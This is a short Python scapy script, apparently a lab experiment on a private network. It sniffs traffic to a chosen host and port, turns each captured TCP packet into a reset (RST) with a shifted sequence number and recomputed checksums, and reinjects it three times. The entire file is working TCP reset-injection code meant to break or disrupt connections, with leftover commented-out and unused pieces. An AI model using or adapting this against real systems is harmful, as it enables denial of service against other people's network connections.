from collections import Counter
from scapy.all import sniff, IP, TCP, send, sendp, Raw
from scapy.interfaces import show_interfaces
import random
cnt = 0
HOST = '192.168.43.112'  # The server's hostname or IP address
PORT = 65432        # The port used by the server

	# server ip		#client ip
ip=IP(src="192.168.43.112", dst="192.168.43.231")
#sport = random.randint(1024,65535)
syn_packet = TCP(sport=65432, dport=34620, flags="R", seq=100)

## Create a Packet Counter
#packet_counts = Counter()

## Define our Custom Action function
def custom_action(packet):
    #for i in range (1):
    old_dst = packet[IP].dst
    old_src = packet[IP].src
    old_dport = packet[IP].dport
    old_sport = packet[IP].sport


    if packet[IP].dst == "192.168.43.112":
        #print(str(packet[IP].dst)+":"+str(packet[IP].dport))
        #print(str(packet[IP].src)+":"+str(packet[IP].sport))
        #print(packet.chksum)

        #packet.show2()
        changedir = False
        if changedir:
            packet[IP].dst = old_src
            packet[IP].src = old_dst
            packet[IP].dport = old_sport
            packet[IP].sport = old_dport
            packet[TCP].seq
            del packet[IP].chksum

        packet[TCP].flags='R'
        packet[TCP].seq = packet[TCP].seq + 100
        #print(str(packet[IP].dst)+":"+str(packet[IP].dport))
        #print(str(packet[IP].src)+":"+str(packet[IP].sport))
        del packet.chksum
        del packet[TCP].chksum
        #packet[Raw].load = ""
        packet.show2()
        #packet = packet.__class__(bytes(packet))
        #print(packet.chksum)

    #packet[TCP].flags='R'
    #sendp(packet)
    for i in range(3):
        sendp(packet)


## Setup sniff, filtering for IP traffic
#print(show_interfaces())
filter = "ip and dst {} and port {}".format(HOST, PORT)
print(filter)
sniff(filter=filter, prn=custom_action, count=10000)

## Print out packet count per A <--> Z address pair
#print("\n".join(f"{f'{key[0]} <--> {key[1]}'}: {count}" for key, count in packet_counts.items()))
